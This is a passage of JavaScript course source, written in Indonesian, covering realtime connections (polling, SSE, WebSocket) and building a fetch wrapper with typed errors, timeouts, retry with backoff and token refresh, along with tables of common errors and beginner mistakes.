      p(
        'Bandingkan panjangnya dengan versi `EventSource` di atas, dan seluruh selisih itu adalah pekerjaan yang harus kamu tulis sendiri karena WebSocket tidak menyediakan penyambungan ulang. Backoff dan jitter di sini adalah pola yang sama persis dengan Bab 3, dan alasannya sama, yaitu supaya lima puluh operator yang terputus bersamaan tidak menyambung ulang serentak dan menjatuhkan server yang baru pulih.',
      ),
      p(
        'Pemeriksaan `soket?.readyState !== WebSocket.OPEN` sebelum mengirim itu wajib. Memanggil `send` pada soket yang sedang menyambung akan melempar, dan memanggilnya pada soket yang tertutup juga. Karena keadaan koneksi bisa berubah kapan saja tanpa kodemu tahu, pemeriksaan itu tidak bisa dilewati. Untuk pesan yang tidak boleh hilang, antrekan dulu lalu kirim saat koneksi terbuka lagi.',
      ),
      callout(
        'tip',
        'Polling masih pilihan yang sah, asal jedanya masuk akal',
        'Kalau datanya berubah sekali dalam beberapa menit, polling tiap tiga puluh detik jauh lebih sederhana daripada koneksi terus terbuka, dan ia bekerja lewat proksi mana pun. Yang perlu ditambahkan hanya menghentikan polling saat tab tidak terlihat lewat `visibilitychange`, dan itu sudah memangkas sebagian besar permintaan sia-sia.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Koneksi terus terbuka punya kegagalan yang berbeda dari permintaan biasa, terutama karena ia bisa mati diam-diam tanpa ada yang memberi tahu.',
      ),
      code(
        'text',
        `
        soket.send(JSON.stringify(data));

        InvalidStateError: Failed to execute 'send' on 'WebSocket':
        Still in CONNECTING state.
        `,
        { caption: 'Pesan dikirim sebelum koneksinya terbuka.' },
      ),
      p(
        'Membuat `WebSocket` tidak langsung membuka koneksinya, sebab jabat tangan butuh waktu. Kode yang mengirim pesan tepat setelah membuat soketnya akan selalu gagal. Jalan keluarnya dua, yaitu kirim dari dalam penangan `open`, atau antrekan pesannya lalu kirim seluruh antrean saat `open` dipicu. Yang kedua lebih baik karena pemanggilnya tidak perlu tahu keadaan koneksi.',
      ),
      code(
        'text',
        `
        sumber.addEventListener('message', (e) => {
          console.log(e.data.jumlah);
        });

        undefined
        `,
        { caption: 'Data dari SSE dan WebSocket selalu berupa teks.' },
      ),
      p(
        'Tidak ada error, dan nilainya `undefined` karena `e.data` adalah teks JSON bukan object. Ini sangat sering karena bentuk penanganannya mirip dengan `fetch` yang sudah menguraikan JSON-nya. Selalu `JSON.parse` lebih dulu, dan bungkus dengan `try` karena pesan yang cacat akan melempar dan mematikan penangan untuk seluruh pesan berikutnya.',
      ),
      code(
        'text',
        `
        # Koneksi terlihat terbuka. readyState = 1. Tidak ada pesan masuk selama 20 menit.
        # Tidak ada peristiwa 'close', tidak ada 'error'.
        `,
        { caption: 'Koneksi mati diam-diam karena diputus proksi di tengah jalan.' },
      ),
      p(
        'Ini kegagalan yang paling menyulitkan pada koneksi terus terbuka. Proksi, penyeimbang beban, dan sebagian jaringan seluler memutus koneksi yang diam terlalu lama, dan pemutusan itu tidak selalu sampai ke kedua sisi. Klien tetap mengira koneksinya hidup. Jalan keluarnya adalah denyut, yaitu klien mengirim pesan kecil tiap tiga puluh detik dan menganggap koneksi mati kalau tidak ada balasan dalam batas tertentu.',
      ),
      code(
        'text',
        `
        # Setelah pengguna bolak-balik antar-halaman sepuluh kali:
        # Sepuluh koneksi WebSocket aktif dari satu tab.
        `,
        { caption: 'Koneksi lama tidak pernah ditutup saat halaman berpindah.' },
      ),
      p(
        'Di aplikasi satu halaman tidak ada pemuatan ulang, jadi koneksi yang dibuka tidak akan tertutup sendiri. Setiap perpindahan halaman menambah satu, dan seluruhnya tetap menerima pesan sehingga penanganmu berjalan berkali-kali untuk satu pesan yang sama. Fungsi pembersih yang mengembalikan `sumber.close()` seperti pada studi kasus bukan penyempurnaan melainkan bagian yang wajib.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            '`Still in CONNECTING state`',
            'Pesan dikirim sebelum koneksi terbuka',
            'Kirim dari penangan `open`, atau antrekan pesannya',
          ],
          [
            '`e.data.x` bernilai `undefined`',
            '`data` berupa teks, bukan object',
            '`JSON.parse` lebih dulu, dan bungkus dengan `try`',
          ],
          [
            'Koneksi diam tanpa pesan dan tanpa `close`',
            'Diputus proksi, dan pemutusannya tidak sampai',
            'Kirim denyut berkala, dan sambung ulang kalau tidak ada balasan',
          ],
          [
            'Satu pesan diproses berkali-kali',
            'Koneksi lama tidak ditutup saat halaman berpindah',
            'Kembalikan fungsi pembersih yang memanggil `close`',
          ],
          [
            'Banner galat berkedip terus',
            'Peristiwa `error` pada SSE juga dipicu saat menyambung ulang',
            'Periksa `readyState`, dan hanya `CLOSED` yang benar-benar gagal',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Realtime terlihat sebagai fitur yang canggih, dan sebagian besar kesalahan di bawah berasal dari memilihnya lebih dulu sebelum menimbang apakah memang dibutuhkan.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Memilih WebSocket untuk data yang mengalir satu arah',
            'Ia yang paling sering disebut untuk realtime',
            'Kamu menanggung penyambungan ulang, denyut, dan urutan pesan sendiri. Untuk satu arah, `EventSource` sudah menyediakan semuanya',
          ],
          [
            'Polling tiap detik supaya terasa cepat',
            'Semakin sering semakin segar',
            'Sembilan puluh sembilan persen permintaan menjawab tidak ada perubahan. Naikkan jedanya, atau pindah ke SSE',
          ],
          [
            'Tidak menghentikan polling saat tab tidak terlihat',
            'Penggunanya kan masih membuka aplikasinya',
            'Tab di latar tetap memanggil server dan menghabiskan baterai. Hentikan lewat `visibilitychange`',
          ],
          [
            'Menyambung ulang segera setiap kali terputus',
            'Supaya cepat pulih',
            'Saat server bermasalah, seluruh klien menyambung serentak dan menjatuhkannya lagi. Pakai backoff dan jitter',
          ],
          [
            'Menganggap pesan pasti sampai dan pasti berurutan',
            'Koneksinya kan terus terbuka',
            'Pesan yang dikirim saat koneksi putus hilang begitu saja. Untuk yang penting, sertakan nomor urut dan minta ulang yang terlewat',
          ],
          [
            'Mengirim seluruh data ulang tiap ada perubahan kecil',
            'Lebih sederhana daripada mengirim selisih',
            'Untuk daftar besar itu boros dan membuat tampilan berkedip. Kirim peristiwa yang menyebut apa yang berubah',
          ],
        ],
      ),
      p(
        'Baris kelima adalah pemahaman yang paling sering terlambat datang. Koneksi terus terbuka memberi kesan bahwa pesan pasti sampai, padahal justru sebaliknya, yaitu pesan yang dikirim selama koneksi putus hilang tanpa jejak dan tidak ada yang memberi tahu. Untuk data yang tidak boleh hilang, koneksi realtime dipakai sebagai pemberi tahu bahwa ada perubahan, dan datanya sendiri tetap diambil lewat permintaan biasa yang bisa dipastikan.',
      ),
      callout(
        'info',
        'Mulai dari yang paling sederhana, naikkan saat terbukti perlu',
        'Urutan yang jarang keliru adalah polling dengan jeda wajar, lalu SSE kalau kesegarannya kurang, lalu WebSocket kalau memang butuh dua arah. Tiap langkah naik menambah kerumitan yang harus kamu rawat selamanya, jadi naik hanya kalau ada alasan yang bisa disebutkan.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        'Polling dulu; SSE untuk satu arah; WebSocket hanya kalau dua arah benar-benar dibutuhkan.',
        'SSE menyambung ulang sendiri; WebSocket tidak.',
        'Selalu `wss://` di produksi.',
        'Selalu tutup koneksi saat ditinggalkan.',
        'Pesan masuk adalah input tidak tepercaya — validasi, jangan render sebagai HTML.',
      ),
      references(
        {
          label: 'Server-sent events',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events/Using_server-sent_events',
          source: 'MDN',
          note: 'Termasuk penyambungan ulang otomatis yang menjadi keunggulan utamanya atas WebSocket.',
        },
        {
          label: 'The WebSocket API',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/WebSocket_API',
          source: 'MDN',
          note: 'Siklus hidup koneksi dan kode penutupan — dasar logika sambung ulang di atas.',
        },
        {
          label: 'EventSource',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/EventSource',
          source: 'MDN',
          note: 'Antarmuka SSE di sisi klien, termasuk penanganan `error` dan `open`.',
        },
        {
          label: 'RFC 6455: The WebSocket Protocol',
          href: 'https://www.rfc-editor.org/rfc/rfc6455.html',
          source: 'IETF',
          note: 'Spesifikasi handshake yang menjelaskan kenapa koneksinya dimulai sebagai HTTP.',
        },
        {
          label: 'WebSocket Security Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Alasan WebSocket wajib punya autentikasi sendiri dan kenapa `wss://` tidak opsional.',
        },
      ),
    ],
  ),

  written(
    'wrapper-fetch',
    'Membungkus `fetch` dengan Rapi',
    21,
    'Satu tempat untuk base URL, timeout, retry, bentuk error, dan header.',
    [
      p(
        'Setelah sepuluh pemanggilan `fetch` tersebar di seluruh aplikasi, kamu akan menemukan timeout yang lupa dipasang di tiga tempat dan penanganan 401 yang berbeda-beda. Satu pembungkus menyelesaikan itu — dan menjadi tempat tunggal untuk memperbaikinya.',
      ),

      terms(
        {
          term: 'wrapper',
          meaning:
            'Terjemahannya **pembungkus**. Satu fungsi yang menyelimuti `fetch` dan menampung semua urusan berulang: base URL, header baku, timeout, penanganan `401`, dan bentuk error. Nilainya bukan menghemat ketikan — nilainya adalah **satu tempat untuk memperbaiki**, alih-alih sepuluh tempat yang perlu diingat semuanya.',
        },
        {
          term: 'base URL',
          meaning:
            'Awalan alamat yang sama untuk seluruh pemanggilan API, misalnya `/api` atau `https://api.contoh.id/v1`. Menaruhnya di satu tempat membuat perpindahan antara lingkungan pengembangan dan produksi cukup mengubah satu nilai.',
        },
        {
          term: 'error terstruktur',
          meaning:
            'Kelas error buatan sendiri seperti `ApiError` yang **membawa keterangan tambahan** selain pesan: `status`, `kode` dari server, dan `detail` error per field. Ini yang memungkinkan pemanggil bereaksi berbeda untuk tiap kasus tanpa mencocokkan teks pesan — pencocokan teks selalu rusak begitu kalimatnya diubah sedikit.',
        },
        {
          term: 'interceptor',
          meaning:
            'Terjemahannya **pencegat**. Fungsi yang berjalan **sebelum setiap permintaan** atau **sesudah setiap jawaban**, sehingga bisa menyisipkan token, mencatat, atau menangani `401` secara terpusat. Istilah ini berasal dari library seperti Axios, tapi polanya bisa kamu tulis sendiri dengan mudah.',
        },
        {
          term: 'single-flight',
          meaning:
            'Terjemahan bebasnya **satu penerbangan saja**. Aturan bahwa hanya boleh ada **satu** proses penyegaran token yang berjalan pada satu waktu. Tanpa itu, lima permintaan yang bersamaan menerima `401` akan memicu lima penyegaran sekaligus — dan sebagian di antaranya membatalkan hasil yang lain.',
        },
        {
          term: 'idempoten (di wrapper)',
          meaning:
            'Syarat sebelum sebuah permintaan boleh diulang otomatis oleh wrapper. Aman untuk `GET`, `PUT`, dan `DELETE`; **berbahaya untuk `POST`**, karena pengulangan bisa menghasilkan dua data. Karena itu logika retry di wrapper wajib memeriksa method-nya, bukan hanya statusnya.',
        },
        {
          term: 'AbortSignal.any',
          meaning:
            'Menggabungkan beberapa signal menjadi satu, sehingga permintaan batal kalau **salah satunya** memicu pembatalan. Dipakai untuk menggabungkan timeout bawaan wrapper dengan signal pembatalan milik pemanggil, tanpa salah satunya harus mengalah.',
        },
        {
          term: 'kontrak',
          meaning:
            'Kesepakatan tentang **apa yang dijanjikan** sebuah fungsi kepada pemanggilnya: bentuk return value, jenis error yang mungkin dilempar, dan perilaku pada kasus khusus. Wrapper yang baik punya kontrak yang jelas — misalnya "selalu melempar `ApiError`, tidak pernah `TypeError` mentah".',
        },
      ),

      h2('Bentuk error yang seragam'),
      code(
        'js',
        `
        export class ApiError extends Error {
          constructor(pesan, { status, kode, detail } = {}) {
            super(pesan);
            this.name = 'ApiError';
            this.status = status;
            this.kode = kode;         // kode dari server, mis. 'EMAIL_TERPAKAI'
            this.detail = detail;     // error per field untuk form
          }

          get bisaDiulang() {
            return this.status === undefined || this.status === 429 || this.status >= 500;
          }
        }
        `,
        { filename: 'src/lib/api-error.js' },
      ),
      p(
        "Kelas ini menerapkan pola `extends Error` dari bab OOP, dan tiga property tambahannya masing-masing punya pemakai yang jelas. `status` dipakai pemanggil untuk membedakan `404` dari kegagalan lain. `kode` membawa penanda dari server seperti `'EMAIL_TERPAKAI'` — jauh lebih andal untuk dicocokkan daripada teks pesan, yang bisa berubah kapan saja saat kalimatnya diperbaiki. `detail` membawa error per field, dan itulah yang membuat pesan validasi bisa ditempelkan tepat di bawah input yang bersangkutan. Destructuring `{ status, kode, detail } = {}` di parameter memakai nilai bawaan objek kosong, sehingga `new ApiError('pesan')` tanpa argumen kedua tetap sah. Yang paling berguna adalah getter `bisaDiulang`: ia menaruh keputusan \"layak diulang atau tidak\" **di dalam objek errornya sendiri**, sehingga logika retry di bagian bawah cukup bertanya alih-alih mengulang daftar status di banyak tempat.",
      ),

      h2('Pembungkusnya'),
      code(
        'js',
        `
        import { ApiError } from './api-error.js';

        const BASE = '/api';
        const TIMEOUT = 10_000;

        async function minta(path, { method = 'GET', body, headers, signal, ...sisa } = {}) {
          const opsi = {
            method,
            headers: { Accept: 'application/json', ...headers },
            signal: signal ?? AbortSignal.timeout(TIMEOUT),
            ...sisa,
          };

          // FormData mengatur Content-Type-nya sendiri — jangan disentuh
          if (body instanceof FormData) {
            opsi.body = body;
          } else if (body !== undefined) {
            opsi.headers['Content-Type'] = 'application/json';
            opsi.body = JSON.stringify(body);
          }

          let res;
          try {
            res = await fetch(BASE + path, opsi);
          } catch (error) {
            if (error.name === 'AbortError') throw error;          // pembatalan disengaja
            throw new ApiError(
              error.name === 'TimeoutError'
                ? 'Server tidak menjawab tepat waktu.'
                : 'Tidak bisa terhubung ke server.',
            );
          }

          if (!res.ok) throw await bacaError(res);
          if (res.status === 204) return null;

          const tipe = res.headers.get('content-type') ?? '';
          return tipe.includes('json') ? res.json() : res.text();
        }

        async function bacaError(res) {
          let body = null;
          try {
            const tipe = res.headers.get('content-type') ?? '';
            if (tipe.includes('json')) body = await res.json();
          } catch {
            // body rusak — jangan sampai ini menutupi status aslinya
          }

          return new ApiError(body?.message ?? \`Permintaan gagal (\${res.status})\`, {
            status: res.status,
            kode: body?.code,
            detail: body?.errors,
          });
        }

        export const api = {
          get:    (p, o)    => minta(p, { ...o, method: 'GET' }),
          post:   (p, b, o) => minta(p, { ...o, method: 'POST', body: b }),
          patch:  (p, b, o) => minta(p, { ...o, method: 'PATCH', body: b }),
          delete: (p, o)    => minta(p, { ...o, method: 'DELETE' }),
        };
        `,
        { filename: 'src/lib/api.js' },
      ),
      p(
        'Perhatikan beberapa keputusan yang menyatukan sub-bab sebelumnya dalam satu fungsi. `body instanceof FormData` diperiksa dulu sebelum menambahkan `Content-Type` sendiri, karena `FormData` butuh menyusun boundary-nya sendiri seperti dijelaskan di sub-bab unggah berkas. `signal: signal ?? AbortSignal.timeout(TIMEOUT)` memberi timeout bawaan, tetapi tetap membiarkan pemanggil mengoper signal pembatalannya sendiri kalau ada. `bacaError` mencoba membaca body sebagai JSON untuk mendapat pesan yang lebih spesifik dari server, tetapi dibungkus `try/catch` supaya body yang rusak atau bukan JSON tidak menutupi kode status aslinya yang sudah pasti valid. Hasilnya, pemanggil di bagian "Memakainya" di bawah tidak perlu tahu detail-detail ini sama sekali dan cukup menangkap `ApiError`.',
      ),

      h2('Memakainya'),
      code(
        'js',
        `
        import { api } from './lib/api.js';
        import { ApiError } from './lib/api-error.js';

        try {
          const tugas = await api.get('/tugas?status=aktif');
          const baru = await api.post('/tugas', { judul: 'Belajar' });
        } catch (error) {
          if (error.name === 'AbortError') return;

          if (error instanceof ApiError && error.detail) {
            tampilkanErrorForm(error.detail);      // error per field
          } else {
            tampilkanError(error.message);
          }
        }
        `,
      ),
      p(
        "Inilah imbalan dari semua pekerjaan di atas, yaitu dua baris permintaan yang **tidak memuat satu pun** `res.ok`, `headers`, `JSON.stringify`, atau `AbortSignal.timeout`. Semua itu sudah dikerjakan di dalam `api`, sekali, untuk seluruh aplikasi. Blok `catch` menunjukkan pembagian penanganan yang rapi dan berlapis. Baris `if (error.name === 'AbortError') return` menyaring pembatalan yang disengaja lebih dulu, sebab ia bukan kegagalan sehingga keluar diam-diam tanpa pesan apa pun. Lalu `error instanceof ApiError && error.detail` menangkap kasus yang paling berguna, yaitu kegagalan validasi yang membawa **error per field** dari server, sehingga pesannya bisa ditempelkan tepat di bawah input yang bersangkutan alih-alih ditampilkan sebagai satu kalimat umum. Sisanya jatuh ke cabang terakhir dengan pesan yang sudah diterjemahkan `minta` menjadi kalimat yang layak dibaca pengguna.",
      ),

      h2('Menambah retry'),
      code(
        'js',
        `
        async function mintaDenganRetry(path, opsi, maksimal = 2) {
          for (let percobaan = 0; ; percobaan++) {
            try {
              return await minta(path, opsi);
            } catch (error) {
              const layak = error instanceof ApiError && error.bisaDiulang;
              if (!layak || percobaan >= maksimal) throw error;

              await new Promise((r) =>
                setTimeout(r, Math.random() * 1000 * 2 ** percobaan),
              );
            }
          }
        }
        `,
      ),
      p(
        'Perhatikan `for (let percobaan = 0; ; percobaan++)` yang bagian kondisinya sengaja **dikosongkan**, jadi loop ini tidak berhenti sendiri. Yang menghentikannya ada di dalam, yaitu `return` saat berhasil atau `throw error` saat sudah tidak layak diulang. Baris penentu adalah `error instanceof ApiError && error.bisaDiulang`, karena hanya kegagalan yang punya kemungkinan berbeda hasilnya yang diulang. Status seperti `400` atau `404` langsung dilempar tanpa membuang waktu, sebab mengulanginya pasti menghasilkan jawaban yang sama. Jedanya memakai formula yang sama persis dengan sub-bab retry di Bab 3, yakni `2 ** percobaan` untuk backoff eksponensial dan `Math.random()` untuk jitter. Peringatan di bawah tetap yang paling penting, karena pola ini hanya aman untuk permintaan yang **idempoten**, dan `POST` bukan salah satunya.',
      ),
      callout(
        'warning',
        'Jangan ulangi otomatis untuk `POST`',
        'Permintaan pertama mungkin **berhasil** dan hanya responsnya yang hilang — mengulangnya membuat data ganda. Batasi retry otomatis ke `GET`, atau kirim `Idempotency-Key` (Backend Intermediate 1.7).',
      ),

      h2('Kapan berhenti menulis sendiri'),
      p(
        'Pembungkus di atas cukup untuk aplikasi kecil sampai menengah. Begitu kamu butuh cache, deduplikasi permintaan yang sama, revalidasi otomatis, dan optimistic update — itu adalah **server state**, dan menulisnya sendiri berarti membangun ulang TanStack Query. Dibahas di Frontend Intermediate Bab 5.',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Aplikasi sudah punya empat puluh pemanggilan `fetch` tersebar di dua puluh berkas. Lalu datang tiga permintaan dalam satu bulan. Tambahkan header versi API di semua permintaan. Catat berapa lama tiap permintaan berjalan untuk pemantauan. Dan tangani sesi habis dengan menyegarkan token lalu mengulang sekali. Ketiganya berarti menyunting empat puluh tempat, dan satu pun yang terlewat menjadi bug yang baru ketahuan berminggu-minggu kemudian.',
      ),
      p(
        'Inilah alasan pembungkus dibuat, dan alasannya bukan supaya kodenya lebih pendek melainkan supaya ada **satu tempat** untuk memutuskan hal yang berlaku bagi semua permintaan.',
      ),
      code(
        'js',
        `
        import { denganUlang } from '../dengan-ulang.js';
        import { ErrorJaringan, ErrorSesi, ErrorAkses, ErrorValidasi, ErrorServer } from './galat.js';

        export function buatKlien({ dasar, versi = 'v1', batasMs = 10_000, onSesiHabis }) {
          let tokenAkses = null;

          async function mentah(jalur, { sinyal, ...opsi } = {}) {
            const gabungan = sinyal
              ? AbortSignal.any([sinyal, AbortSignal.timeout(batasMs)])
              : AbortSignal.timeout(batasMs);

            const kepala = new Headers(opsi.headers);
            kepala.set('Accept', 'application/json');
            kepala.set('X-Api-Version', versi);
            if (tokenAkses) kepala.set('Authorization', \`Bearer \${tokenAkses}\`);
            // JANGAN setel Content-Type kalau badannya FormData.
            if (opsi.body && !(opsi.body instanceof FormData)) {
              kepala.set('Content-Type', 'application/json');
            }

            const mulai = performance.now();
            let respons;
            try {
              respons = await fetch(dasar + jalur, { ...opsi, headers: kepala, signal: gabungan });
            } catch (penyebab) {
              if (penyebab.name === 'AbortError') throw penyebab;
              throw new ErrorJaringan('Tidak bisa menghubungi server', { cause: penyebab });
            } finally {
              catatDurasi(jalur, opsi.method ?? 'GET', Math.round(performance.now() - mulai));
            }

            return respons;
          }

          async function json(jalur, opsi = {}) {
            let respons = await mentah(jalur, opsi);

            // Sesi habis: segarkan lalu ulang TEPAT SEKALI.
            if (respons.status === 401 && (await onSesiHabis?.())) {
              tokenAkses = await ambilTokenBaru();
              respons = await mentah(jalur, opsi);
            }

            if (respons.status === 204) return null;
            if (respons.status === 401) throw new ErrorSesi();
            if (respons.status === 403) throw new ErrorAkses();
            if (respons.status === 422) {
              const isi = await respons.json().catch(() => ({}));
              throw new ErrorValidasi(isi.pesan ?? 'Data tidak sah', isi.field);
            }
            if (respons.status >= 500) throw new ErrorServer(respons.status);
            if (!respons.ok) throw new Error(\`Status tak terduga \${respons.status}\`);

            return respons.json();
          }

          return {
            setToken: (t) => { tokenAkses = t; },
            ambil: (jalur, opsi) => denganUlang(() => json(jalur, opsi), { maks: 3 }),
            kirim: (jalur, isi, opsi = {}) =>
              json(jalur, { ...opsi, method: 'POST', body: JSON.stringify(isi) }),
            ganti: (jalur, isi, opsi = {}) =>
              json(jalur, { ...opsi, method: 'PUT', body: JSON.stringify(isi) }),
            hapus: (jalur, opsi = {}) => json(jalur, { ...opsi, method: 'DELETE' }),
            unggah: (jalur, formData, opsi = {}) =>
              json(jalur, { ...opsi, method: 'POST', body: formData }),
          };
        }
        `,
        { filename: 'src/api/klien.js' },
      ),
      p(
        'Pembagian menjadi `mentah` dan `json` bukan pemecahan asal, melainkan pemisahan dua tanggung jawab yang berbeda. Fungsi `mentah` mengurus segala yang berhubungan dengan **permintaan**, yaitu header, batas waktu, pembatalan, dan pencatatan durasi. Fungsi `json` mengurus segala yang berhubungan dengan **jawaban**, yaitu status, penyegaran sesi, dan penguraian. Pemisahan itu membuat unggahan berkas yang butuh respons mentah bisa memakai `mentah` langsung tanpa mengakali `json`.',
      ),
      p(
        'Baris `if (opsi.body && !(opsi.body instanceof FormData))` menutup jebakan dari Sub-bab 5.5 sekali untuk seluruh aplikasi. Tanpa pemeriksaan itu, pembungkus yang selalu menyetel `Content-Type: application/json` akan merusak setiap unggahan berkas. Ini contoh keuntungan pembungkus yang paling langsung, yaitu satu jebakan ditutup di satu tempat dan tidak akan pernah muncul lagi.',
      ),
      p(
        'Perhatikan `denganUlang` hanya dipasang pada `ambil`, bukan pada `kirim` dan `ganti`. Ini keputusan yang disengaja dan mengikuti aturan dari Bab 3, yaitu hanya operasi yang boleh diulang tanpa efek tambahan yang layak diulang otomatis. Mengulang `POST` tanpa kunci idempoten berarti risiko pesanan ganda, jadi keputusan mengulangnya diserahkan ke pemanggil yang tahu konteksnya.',
      ),
      p(
        'Blok `finally` yang memanggil `catatDurasi` berjalan pada seluruh jalur, termasuk saat permintaannya gagal. Ini penting karena permintaan yang gagal justru yang paling perlu diketahui durasinya. Angka itu bisa langsung dikirim ke pemantauan, dan begitu tersedia kamu punya jawaban untuk pertanyaan endpoint mana yang paling lambat tanpa perlu menebak.',
      ),
      callout(
        'warning',
        'Pembungkus yang terlalu pintar lebih buruk daripada tidak ada pembungkus',
        'Pembungkus yang diam-diam menelan kegagalan, mengembalikan array kosong saat gagal, atau mengulang segalanya akan menyembunyikan masalah dari seluruh aplikasi sekaligus. Batasnya jelas, yaitu pembungkus boleh menyeragamkan bentuk dan menambah hal yang berlaku untuk semua, dan tidak boleh mengambil keputusan yang seharusnya milik pemanggil.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Pembungkus memindahkan kegagalan ke satu tempat, dan itu berarti satu kesalahan di sana berdampak ke seluruh aplikasi.',
      ),
      code(
        'text',
        `
        await klien.unggah('/foto', formData);

        400 Bad Request — no multipart boundary was found
        `,
        { caption: 'Pembungkus menyetel `Content-Type` untuk semua badan permintaan.' },
      ),
      p(
        'Ini kegagalan pembungkus yang paling sering, dan ia hanya muncul pada satu jalur sehingga mudah lolos pengujian. Pemeriksaan `instanceof FormData` pada studi kasus di atas ada justru untuk ini. Perlu diingat pemeriksaannya harus memakai `instanceof` dan bukan memeriksa method HTTP-nya, sebab `POST` bisa mengirim JSON maupun berkas.',
      ),
      code(
        'text',
        `
        // Token dicabut server. Klien menyegarkan, gagal, menyegarkan lagi...
        POST /api/refresh  401
        POST /api/refresh  401
        POST /api/refresh  401
        (terus menerus)
        `,
        { caption: 'Penyegaran sesi tidak dibatasi satu kali.' },
      ),
      p(
        'Kalau percobaan setelah penyegaran juga menjawab 401 dan kodenya menyegarkan lagi, terbentuk putaran yang tidak pernah berhenti. Halaman tidak membeku karena setiap putaran menunggu jaringan, sehingga tidak ada peringatan apa pun, dan yang terlihat hanya permintaan yang mengalir terus di tab Network. Batas satu kali pada studi kasus di atas menutupnya, dan itu satu baris yang mudah terlewat.',
      ),
      code(
        'text',
        `
        // Dua puluh permintaan berangkat bersamaan, semuanya 401.
        // Dua puluh permintaan penyegaran dikirim sekaligus.
        `,
        { caption: 'Tidak ada peredam saat banyak permintaan gagal bersamaan.' },
      ),
      p(
        'Saat token kedaluwarsa, seluruh permintaan yang sedang berjalan akan menjawab 401 hampir bersamaan, dan masing-masing memicu penyegarannya sendiri. Server menerima dua puluh permintaan penyegaran untuk satu pengguna, dan sebagian di antaranya akan gagal karena token penyegar sudah dirotasi oleh yang pertama. Jalan keluarnya menyimpan janji penyegaran yang sedang berjalan lalu membiarkan seluruh pemanggil menunggu janji yang sama.',
      ),
      code(
        'text',
        `
        const data = await klien.ambil('/pesanan');
        console.log(data.length);
                        ^

        TypeError: Cannot read properties of null (reading 'length')
        `,
        { caption: 'Endpoint menjawab 204, dan pembungkus mengembalikan `null`.' },
      ),
      p(
        'Ini bukan bug pembungkus melainkan kontrak yang perlu diketahui pemakainya. Pembungkus mengembalikan `null` untuk 204, dan pemanggil harus menanganinya. Pilihan lain adalah membuat pembungkus mengembalikan bentuk yang sama dengan yang diharapkan, misalnya array kosong, dan itu justru berbahaya karena menyamarkan perbedaan antara tidak ada isi dan daftar kosong. Nyatakan kontraknya di komentar, dan lebih baik lagi di tipe kalau memakai TypeScript.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            '`no multipart boundary was found`',
            'Pembungkus menyetel `Content-Type` untuk `FormData` juga',
            'Periksa `instanceof FormData` sebelum menyetelnya',
          ],
          [
            'Permintaan penyegaran berulang tanpa henti',
            'Percobaan setelah penyegaran tidak dibatasi',
            'Ulang tepat sekali, lalu lempar `ErrorSesi`',
          ],
          [
            'Dua puluh penyegaran sekaligus',
            'Tiap permintaan yang gagal menyegarkan sendiri-sendiri',
            'Simpan janji penyegaran yang sedang berjalan, dan biarkan semuanya menunggu janji yang sama',
          ],
          [
            '`Cannot read properties of null`',
            '204 dikembalikan sebagai `null`',
            'Tangani `null` di pemanggil, dan nyatakan kontraknya',
          ],
          [
            'Batas waktu tercapai padahal tiap permintaan cepat',
            'Jeda antar-percobaan ulang ikut memakan anggaran waktu',
            'Pasang batas waktu per percobaan, bukan untuk keseluruhan',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Pembungkus adalah tempat keputusan yang berlaku untuk seluruh aplikasi, jadi kesalahan di sini berlipat ganda dampaknya.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Membuat pembungkus yang mengembalikan `null` saat gagal',
            'Pemanggilnya jadi tidak perlu `try`',
            'Kegagalan menjadi tidak terlihat, dan pemanggil memperlakukan gangguan server sama dengan data kosong. Lempar, jangan kembalikan nilai kosong',
          ],
          [
            'Menaruh pengulangan untuk semua method',
            'Semakin tangguh semakin baik',
            '`POST` yang diulang bisa menghasilkan data ganda. Ulang hanya yang boleh diulang',
          ],
          [
            'Menyetel `Content-Type` untuk semua permintaan berbadan',
            'Semua kiriman kan JSON',
            'Unggahan berkas rusak. Periksa jenis badannya lebih dulu',
          ],
          [
            'Membuat pembungkus yang menerima puluhan opsi',
            'Supaya fleksibel untuk semua kebutuhan',
            'Ia menjadi sama rumitnya dengan `fetch` sekaligus punya kejutannya sendiri. Sediakan opsi yang memang dipakai, dan biarkan sisanya diteruskan apa adanya',
          ],
          [
            'Menyimpan alamat dasar di beberapa tempat',
            'Tiap modul tahu alamatnya sendiri',
            'Mengubah lingkungan berarti menyunting banyak berkas. Satu tempat, dan diberikan saat pembuatan klien',
          ],
          [
            'Tidak menyediakan cara melewati pembungkus',
            'Semua harus lewat sini supaya seragam',
            'Selalu ada satu kasus yang butuh perilaku berbeda, misalnya mengunduh berkas biner. Sediakan fungsi `mentah` yang mengembalikan respons apa adanya',
          ],
        ],
      ),
      p(
        'Baris pertama layak ditegaskan karena ia terlihat seperti kemudahan dan sebenarnya memindahkan biaya. Pembungkus yang mengembalikan `null` saat gagal membuat pemanggil tidak bisa membedakan tiga keadaan yang berbeda, yaitu tidak ada data, gangguan jaringan, dan kesalahan server. Ketiganya menuntut tampilan yang berbeda, dan menyatukannya menjadi `null` berarti pengguna selalu melihat keadaan kosong bahkan saat yang terjadi adalah gangguan.',
      ),
      callout(
        'tip',
        'Tanda bahwa pembungkusmu sudah cukup baik',
        'Coba jawab tiga pertanyaan ini. Kalau perlu menambah satu header ke semua permintaan, berapa berkas yang disunting. Kalau perlu tahu endpoint mana yang paling lambat, apakah datanya sudah ada. Dan kalau ada satu endpoint yang butuh perilaku berbeda, apakah ada jalan keluarnya tanpa mengakali. Jawaban yang baik adalah satu berkas, sudah, dan ada.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
